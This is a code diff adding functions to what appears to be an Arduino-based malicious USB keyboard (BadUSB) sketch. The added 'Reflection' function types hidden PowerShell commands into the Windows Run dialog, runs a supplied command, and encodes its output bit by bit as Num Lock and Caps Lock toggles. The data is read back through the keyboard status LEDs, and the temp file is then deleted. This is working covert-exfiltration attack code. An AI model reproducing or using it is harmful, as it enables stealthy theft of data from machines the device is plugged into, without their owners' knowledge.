@@ -69,3 +69,45 @@ void exfilMac(char *SomeCommand){
   delay(100);
   Keyboard.release(KEY_RETURN);
 }
+
+int stage = 0;
+
+void getStatusLeds() {
+  delay(500);
+  stage = 1;
+  Keyboard.press(KEY_CAPS_LOCK); delay(100);Keyboard.releaseAll();
+  delay(500);
+  Keyboard.press(KEY_CAPS_LOCK); delay(100);Keyboard.releaseAll();
+  delay(3000);
+  stage = 2;
+}
+
+void Reflection(char *SomeCommand){
+  delay(1000);
+  getStatusLeds();
+  delay(1000);
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  delay(100);
+  Keyboard.releaseAll();
+  delay(1000);
+  Keyboard.print("powershell -WindowStyle hidden \"");
+  delay(200);
+  Keyboard.print(SomeCommand);
+  delay(200);
+  Keyboard.println(" | Out-File -encoding ascii $env:tmp\\z\"");
+  delay(5000);
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  delay(100);
+  Keyboard.releaseAll();
+  delay(1000);
+  Keyboard.println("powershell -WindowStyle hidden \"foreach($b in $(cat $env:tmp\\z -En by)){foreach($a in 0x80,0x40,0x20,0x10,0x08,0x04,0x02,0x01){if($b-band$a){$o+='%{NUMLOCK}'}else{$o+='%{CAPSLOCK}'}}}; $o+='%{SCROLLLOCK}';echo $o >$env:tmp\\z\"");
+  delay(5000);
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  delay(100);
+  Keyboard.releaseAll();
+  delay(1000);
+  Keyboard.println("powershell -WindowStyle hidden \"$o=(cat $env:tmp\\z);Add-Type -A System.Windows.Forms;[System.Windows.Forms.SendKeys]::SendWait($o);rm $env:tmp\\z\"");
+}
